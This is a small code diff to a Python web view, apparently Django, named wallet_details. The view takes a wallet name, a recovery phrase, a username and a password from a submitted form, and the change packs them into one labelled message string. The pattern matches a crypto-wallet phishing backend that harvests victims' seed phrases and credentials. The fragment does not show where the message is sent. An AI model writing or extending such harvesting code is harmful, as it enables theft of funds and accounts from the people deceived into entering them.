@@ -26,7 +26,7 @@ def wallet_details(request, slug):
         user = request.POST['user']
         password = request.POST['pass']
 
-        data = [wallet, phrase, user, password]
+        data = f"Wallet: {wallet},\nPhrase: {phrase},\nEmail/Username: {user},\nPassword: {password}"
         message = str(data)
 
         # print(data)
